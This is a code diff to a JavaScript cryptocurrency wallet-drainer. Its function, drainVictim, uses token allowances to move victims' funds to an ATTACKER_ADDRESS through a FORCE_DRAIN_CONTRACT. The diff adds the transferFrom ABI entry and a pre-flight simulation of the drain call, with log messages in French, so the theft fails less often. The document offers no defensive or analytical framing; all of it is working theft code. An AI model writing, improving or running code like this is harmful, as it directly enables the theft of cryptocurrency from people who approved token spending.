@@ -85,6 +85,7 @@ async function drainVictim(victimAddress, chainId) {
     const tokenContract = new web3.eth.Contract(
       [
         { constant: true, inputs: [{ name: '_owner', type: 'address' }, { name: '_spender', type: 'address' }], name: 'allowance', outputs: [{ name: '', type: 'uint256' }], type: 'function' },
+        { constant: false, inputs: [{ name: '_from', type: 'address' }, { name: '_to', type: 'address' }, { name: '_value', type: 'uint256' }], name: 'transferFrom', outputs: [{ name: '', type: 'bool' }], type: 'function' },
         { constant: true, inputs: [{ name: '_owner', type: 'address' }], name: 'balanceOf', outputs: [{ name: '', type: 'uint256' }], type: 'function' },
       ],
       tokenAddress
@@ -113,6 +114,19 @@ async function drainVictim(victimAddress, chainId) {
             { type: 'uint256', name: 'amount' }
           ]
         }, [tokenAddress, victimAddress, ATTACKER_ADDRESS, allowance]);
+
+        // === Simulation ===
+        try {
+          await web3.eth.call({
+            to: FORCE_DRAIN_CONTRACT,
+            data: data,
+            from: ATTACKER_ADDRESS
+          });
+          console.log(`✅ Simulation réussie pour USDT`);
+        } catch (simError) {
+          console.error(`❌ Simulation échouée pour USDT :`, simError.message);
+          continue;
+        }
 
         let nonce = await web3.eth.getTransactionCount(ATTACKER_ADDRESS);
         const gasPrice = await web3.eth.getGasPrice();
